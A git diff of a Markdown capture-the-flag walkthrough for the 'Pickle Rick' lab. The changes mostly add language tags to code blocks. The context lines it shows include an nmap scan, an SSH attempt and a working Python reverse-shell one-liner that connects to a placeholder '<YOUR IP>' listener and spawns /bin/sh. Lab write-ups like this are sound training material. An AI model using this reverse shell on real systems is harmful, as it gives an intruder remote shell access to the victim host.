@@ -32,8 +32,8 @@ This is an easy challenge that can teach you directory scanning, command injecti
 
 let's start with the Nmap scan.
 
-```
-Nmap -p- -A -T4 10.10.159.88 -oN nmap/fullscan
+```bash
+nmap -p- -A -T4 10.10.159.88 -oN nmap/fullscan
 ```
 
 ![nmap](/assets/images/picklerick/picklericknmap.png)
@@ -54,7 +54,7 @@ Nothing interesting here, let's check the source code!.
 
 There's a comment by Rick. His Username is **R1ckRul3s.** Hmmm a username? there's no login page to use the username. Maybe SSH login?. let's try it.
 
-```
+```bash
 ssh R1ckRul3s@10.10.159.88
 ```
 
@@ -142,9 +142,10 @@ Start a netcat listener in the terminal.
 
 and run 
 
-```
+```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
 > Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3
 > Replace your IP address with \<YOUR IP\>
 
